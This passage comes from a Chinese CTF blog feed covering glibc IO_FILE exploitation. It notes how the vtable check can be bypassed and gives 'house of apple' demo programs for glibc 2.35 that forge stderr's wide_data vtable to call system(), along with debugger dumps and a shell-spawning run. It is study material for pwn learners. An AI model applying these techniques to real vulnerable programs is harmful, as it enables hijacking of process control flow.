function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>vtable</code> 必须要满足 在 <code>__stop___IO_vtables</code> 和 <code>__start___libc_IO_vtables</code>之间，而我们伪造的<code>vtable</code>通常不满足这个条件。<br>但是<code> _IO_str_jumps</code> 与 <code>_IO_wstr_jumps </code>就位于<code>__stop___libc_IO_vtables</code>和<code>__start___libc_IO_vtables</code>之间，所以我们是可以利用他们来绕过<code>IO_validate_vtable</code>的检测的,只需要将 <code>vtable </code>填成 <code>_IO_str_jumps </code>或<code>_IO_wstr_jumps</code>地址即可。<br>利用方式主要有针对 <code>_IO_str_jumps</code> 中的<code>_IO_str_finsh</code>函数和 <code>_IO_str_overflow</code>两种，这里先简单提一嘴，后续开新博客细说（<del>咕咕</del>）<br>同样的在glibc2.24+，简单的FSOP利用变得非常困难<br></p><table><thead><tr><th>机制</th><th>目的</th></tr></thead><tbody><tr><td><code>_IO_vtable_check</code></td><td>检查 vtable 是否在 <code>__libc_IO_vtables</code> 区域</td></tr><tr><td><code>_flags</code>、<code>_mode</code> 等验证</td><td>强化 <code>_IO_FILE</code> 的完整性与一致性</td></tr><tr><td><code>_chain</code> 检查</td><td>强化链表结构的正确性</td></tr><tr><td>强制使用 <code>_IO_FILE_plus</code></td><td>限制构造自由度</td></tr></tbody></table><p>于是有了house of系列攻击方法，house of 系列后面再继续学习，会开新博客的（<del>咕咕</del>）<br></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
          <category> _IO_FILE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于house of apple</title>
      <link href="/2025/07/27/%E5%85%B3%E4%BA%8Ehouse-of-apple/"/>
      <url>/2025/07/27/%E5%85%B3%E4%BA%8Ehouse-of-apple/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>在复现LitCTF2024的heap-2.39时候遇到了house of apple，既然碰到了，那么就学习一下吧！（<del>其实在上学期校赛的时候就碰到了</del>）</p><h2 id="0x01-house-of-apple-原理"><a href="#0x01-house-of-apple-原理" class="headerlink" title="0x01 house of apple 原理"></a>0x01 house of apple 原理</h2><p>先贴上roderick01师傅的原创文章镇帖（<br>[<a href="https://bbs.kanxue.com/thread-273418.htm">原创] House of apple 一种新的glibc中IO攻击方法 (1)-Pwn-看雪-安全社区|安全招聘|kanxue.com</a><br>[<a href="https://bbs.kanxue.com/thread-273832.htm">原创] House of apple 一种新的glibc中IO攻击方法 (2)-Pwn-看雪-安全社区|安全招聘|kanxue.com</a><br>[<a href="https://bbs.kanxue.com/thread-273863.htm">原创]House of apple 一种新的glibc中IO攻击方法 (3)-Pwn-看雪-安全社区|安全招聘|kanxue.com</a><br></p><p>我们调试demo （姑且先看apple2）<br></p><h4 id="IO-wfile-overflow"><a href="#IO-wfile-overflow" class="headerlink" title="_IO_wfile_overflow"></a>_IO_wfile_overflow</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_overflow</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</span><br></pre></td></tr></table></figure><p>demo如下（glibc2.35）<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> *p1 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="type">char</span> *p2 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate two 0x200 chunks&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;<span class="built_in">puts</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> _IO_2_1_stderr_addr = puts_addr + <span class="number">0x19a850</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_2_1_stderr_ address: %p\n&quot;</span>, (<span class="type">void</span> *)_IO_2_1_stderr_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> _IO_wfile_jumps_addr = puts_addr + <span class="number">0x196270</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wfile_jumps address: %p\n&quot;</span>, (<span class="type">void</span> *)_IO_wfile_jumps_addr);</span><br><span class="line">  </span><br><span class="line">    <span class="type">char</span> *stderr2 = (<span class="type">char</span> *)_IO_2_1_stderr_addr;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: change stderr-&gt;_flags to 0xfffff7f5 + ;sh&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr2 = <span class="number">0xfbadf7f5</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(&amp;stderr2[<span class="number">4</span>], <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;;sh\x00&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: set stderr-&gt;_IO_write_base &lt;  stderr-&gt;_IO_write_ptr&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0x20</span>) = (<span class="type">size_t</span>)<span class="number">1</span>;</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0x28</span>) = (<span class="type">size_t</span>)<span class="number">2</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: change stderr-&gt;_mode to -1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0xc0</span>) = <span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: change stderr-&gt;vtable to _IO_wfile_jumps&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0xd8</span>) = _IO_wfile_jumps_addr;</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: replace stderr-&gt;_wide_data with the allocated chunk p1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0xa0</span>) = (<span class="type">size_t</span>)p1;</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 6: set stderr-&gt;_wide_data-&gt;_wide_vtable with the allocated chunk p2&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(p1 + <span class="number">0xe0</span>) = (<span class="type">size_t</span>)p2;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 7: set stderr-&gt;_wide_data-&gt;_IO_write_base = 0  stderr-&gt;_wide_data-&gt;_IO_buf_base = 0&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(p1 + <span class="number">0x30</span>) = (<span class="type">size_t</span>)<span class="number">0</span>;</span><br><span class="line">    *(<span class="type">size_t</span> *)(p1 + <span class="number">0x18</span>) = (<span class="type">size_t</span>)<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 8: put backdoor at fake _wide_vtable-&gt;doallocate&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> sys_addr = (<span class="type">size_t</span>)&amp;system;</span><br><span class="line">    *(<span class="type">size_t</span> *)(p2 + <span class="number">0x68</span>) = (<span class="type">size_t</span>)(sys_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 9: call exit to trigger backdoor func&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接运行到最后一步前，看<code>stderr</code>的相关状态<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *stderr</span><br><span class="line">$2 = &#123;</span><br><span class="line">  _flags = -72484875,</span><br><span class="line">  _IO_read_ptr = 0x7ffff7e1b723 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_read_end = 0x7ffff7e1b723 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_read_base = 0x7ffff7e1b723 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_write_base = 0x1 &lt;error: Cannot access memory at address 0x1&gt;,</span><br><span class="line">  _IO_write_ptr = 0x2 &lt;error: Cannot access memory at address 0x2&gt;,</span><br><span class="line">  _IO_write_end = 0x7ffff7e1b723 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_buf_base = 0x7ffff7e1b723 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_buf_end = 0x7ffff7e1b724 &lt;_IO_2_1_stderr_+132&gt; &quot;&quot;,</span><br><span class="line">  _IO_save_base = 0x0,</span><br><span class="line">  _IO_backup_base = 0x0,</span><br><span class="line">  _IO_save_end = 0x0,</span><br><span class="line">  _markers = 0x0,</span><br><span class="line">  _chain = 0x7ffff7e1b780 &lt;_IO_2_1_stdout_&gt;,</span><br><span class="line">  _fileno = 2,</span><br><span class="line">  _flags2 = 0,</span><br><span class="line">  _old_offset = -1,</span><br><span class="line">  _cur_column = 0,</span><br><span class="line">  _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">  _shortbuf = &quot;&quot;,</span><br><span class="line">  _lock = 0x7ffff7e1ca60 &lt;_IO_stdfile_2_lock&gt;,</span><br><span class="line">  _offset = -1,</span><br><span class="line">  _codecvt = 0x0,</span><br><span class="line">  _wide_data = 0x5555555592a0,</span><br><span class="line">  _freeres_list = 0x0,</span><br><span class="line">  _freeres_buf = 0x0,</span><br><span class="line">  __pad5 = 0,</span><br><span class="line">  _mode = -1,</span><br><span class="line">  _unused2 = &quot;\377\377\377\377&quot;, &#x27;\000&#x27; &lt;repeats 15 times&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p *(struct _IO_wide_data*)0x5555555592a0</span><br><span class="line">$3 = &#123;</span><br><span class="line">  _IO_read_ptr = 0x0,</span><br><span class="line">  _IO_read_end = 0x0,</span><br><span class="line">  _IO_read_base = 0x0,</span><br><span class="line">  _IO_write_base = 0x0,</span><br><span class="line">  _IO_write_ptr = 0x0,</span><br><span class="line">  _IO_write_end = 0x0,</span><br><span class="line">  _IO_buf_base = 0x0,</span><br><span class="line">  _IO_buf_end = 0x0,</span><br><span class="line">  _IO_save_base = 0x0,</span><br><span class="line">  _IO_backup_base = 0x0,</span><br><span class="line">  _IO_save_end = 0x0,</span><br><span class="line">  _IO_state = &#123;</span><br><span class="line">    __count = 0,</span><br><span class="line">    __value = &#123;</span><br><span class="line">      __wch = 0,</span><br><span class="line">      __wchb = &quot;\000\000\000&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  _IO_last_state = &#123;</span><br><span class="line">    __count = 0,</span><br><span class="line">    __value = &#123;</span><br><span class="line">      __wch = 0,</span><br><span class="line">      __wchb = &quot;\000\000\000&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  _codecvt = &#123;</span><br><span class="line">    __cd_in = &#123;</span><br><span class="line">      step = 0x0,</span><br><span class="line">      step_data = &#123;</span><br><span class="line">        __outbuf = 0x0,</span><br><span class="line">        __outbufend = 0x0,</span><br><span class="line">        __flags = 0,</span><br><span class="line">        __invocation_counter = 0,</span><br><span class="line">        __internal_use = 0,</span><br><span class="line">        __statep = 0x0,</span><br><span class="line">        __state = &#123;</span><br><span class="line">          __count = 0,</span><br><span class="line">          __value = &#123;</span><br><span class="line">            __wch = 0,</span><br><span class="line">            __wchb = &quot;\000\000\000&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    __cd_out = &#123;</span><br><span class="line">      step = 0x0,</span><br><span class="line">      step_data = &#123;</span><br><span class="line">        __outbuf = 0x0,</span><br><span class="line">        __outbufend = 0x0,</span><br><span class="line">        __flags = 0,</span><br><span class="line">        __invocation_counter = 0,</span><br><span class="line">        __internal_use = 0,</span><br><span class="line">        __statep = 0x0,</span><br><span class="line">        __state = &#123;</span><br><span class="line">          __count = 0,</span><br><span class="line">          __value = &#123;</span><br><span class="line">            __wch = 0,</span><br><span class="line">            __wchb = &quot;\000\000\000&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  _shortbuf = L&quot;&quot;,</span><br><span class="line">  _wide_vtable = 0x5555555594b0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p *(struct _IO_jump_t*) 0x5555555594b0</span><br><span class="line">$4 = &#123;</span><br><span class="line">  __dummy = 0,</span><br><span class="line">  __dummy2 = 0,</span><br><span class="line">  __finish = 0x0,</span><br><span class="line">  __overflow = 0x0,</span><br><span class="line">  __underflow = 0x0,</span><br><span class="line">  __uflow = 0x0,</span><br><span class="line">  __pbackfail = 0x0,</span><br><span class="line">  __xsputn = 0x0,</span><br><span class="line">  __xsgetn = 0x0,</span><br><span class="line">  __seekoff = 0x0,</span><br><span class="line">  __seekpos = 0x0,</span><br><span class="line">  __setbuf = 0x0,</span><br><span class="line">  __sync = 0x0,</span><br><span class="line">  __doallocate = 0x7ffff7c50d70 &lt;__libc_system&gt;,</span><br><span class="line">  __read = 0x0,</span><br><span class="line">  __write = 0x0,</span><br><span class="line">  __seek = 0x0,</span><br><span class="line">  __close = 0x0,</span><br><span class="line">  __stat = 0x0,</span><br><span class="line">  __showmanyc = 0x0,</span><br><span class="line">  __imbue = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结一下条件<br><code>fp-&gt;_flags</code>设置为<code>0xfffff7f5</code>或者<code>0xfbadf7f5</code>（满足<code>~(2 | 0x8 | 0x800)</code>），后续四字节根据情况设置为<code>;sh\x00</code><br><code>fp-&gt;vtable</code>设置为<code>_IO_wfile_jumps</code> (<code>/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>)<br><code>fp-&gt;_IO_write_ptr</code> <strong>&gt;</strong> <code>fp-&gt;_IO_write_base</code><br><code>fp-&gt;_wide_data</code>写入可控地址<br><code>fp-&gt;_wide_data-&gt;_wide_vtable-&gt;doallocate</code>（位于<code>fp-&gt;_wide_data-&gt;_wide_vtable+0x68</code>）设置为后门函数<br><code>fp-&gt;_wide_data-&gt;_IO_write_base</code> &#x3D;&#x3D; <code>fp-&gt;_wide_data-&gt;_IO_buf_base</code> &#x3D;&#x3D; <strong>0</strong><br><br>至于这些条件为什么这么设置，看<code>glibc</code>源码便知<br>我们看最终效果<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">r3t2@LAPTOP-6JKPOVPE:~/CTF/pwn_demos/apple$ ./demo3</span><br><span class="line">[*] allocate two 0x200 chunks</span><br><span class="line">[*] _IO_2_1_stderr_ address: 0x7835d481b6a0</span><br><span class="line">[*] _IO_wfile_jumps address: 0x7835d48170c0</span><br><span class="line">[+] step 1: change stderr-&gt;_flags to 0xfffff7f5 + ;sh</span><br><span class="line">[+] step 2: set stderr-&gt;_IO_write_base &lt;  stderr-&gt;_IO_write_ptr</span><br><span class="line">[+] step 3: change stderr-&gt;_mode to -1</span><br><span class="line">[+] step 4: change stderr-&gt;vtable to _IO_wfile_jumps</span><br><span class="line">[+] step 5: replace stderr-&gt;_wide_data with the allocated chunk p1</span><br><span class="line">[+] step 6: set stderr-&gt;_wide_data-&gt;_wide_vtable with the allocated chunk p2</span><br><span class="line">[+] step 7: set stderr-&gt;_wide_data-&gt;_IO_write_base = 0  stderr-&gt;_wide_data-&gt;_IO_buf_base = 0</span><br><span class="line">[+] step 8: put backdoor at fake _wide_vtable-&gt;doallocate</span><br><span class="line">[+] step 9: call exit to trigger backdoor func</span><br><span class="line">sh: 1: ����: not found</span><br><span class="line">$ whoami</span><br><span class="line">r3t2</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>成功getshell<br></p><h4 id="IO-wdefault-xsgetn"><a href="#IO-wdefault-xsgetn" class="headerlink" title="_IO_wdefault_xsgetn"></a>_IO_wdefault_xsgetn</h4><p><strong>这条链执行的条件是调用到_IO_wdefault_xsgetn时rdx寄存器，也就是第三个参数不为0</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_wdefault_xsgetn</span><br><span class="line">    __wunderflow</span><br><span class="line">        _IO_switch_to_wget_mode</span><br><span class="line">            _IO_WOVERFLOW</span><br><span class="line">                *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)</span><br></pre></td></tr></table></figure><p>demo如下（glibc2.35）<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m[!] Backdoor is called!\n&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> *p1 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="type">char</span> *p2 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate two 0x200 chunks&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;<span class="built_in">puts</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> _IO_2_1_stderr_addr = puts_addr + <span class="number">0x19a850</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_2_1_stderr_ address: %p\n&quot;</span>, (<span class="type">void</span> *)_IO_2_1_stderr_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> _IO_wstrn_jumps_addr = puts_addr + <span class="number">0x19a850</span>+<span class="number">0xd8</span><span class="number">-0x4998</span><span class="number">-0x20</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wstrn_jumps address: %p\n&quot;</span>, (<span class="type">void</span> *)_IO_wstrn_jumps_addr);</span><br><span class="line">  </span><br><span class="line">    <span class="type">char</span> *stderr2 = (<span class="type">char</span> *)_IO_2_1_stderr_addr;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: change stderr-&gt;_flags to 0x800&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr2 = <span class="number">0x800</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: change stderr-&gt;_mode to 1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0xc0</span>) = <span class="number">1</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: change stderr-&gt;vtable to _IO_wstrn_jumps - 0x20&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0xd8</span>) = _IO_wstrn_jumps_addr - <span class="number">0x20</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: replace stderr-&gt;_wide_data with the allocated chunk p1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0xa0</span>) = (<span class="type">size_t</span>)p1;</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: set stderr-&gt;_wide_data-&gt;_wide_vtable with the allocated chunk p2&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(p1 + <span class="number">0xe0</span>) = (<span class="type">size_t</span>)p2;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 6: set stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_ptr &gt;  stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_base&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(p1 + <span class="number">0x20</span>) = (<span class="type">size_t</span>)<span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span 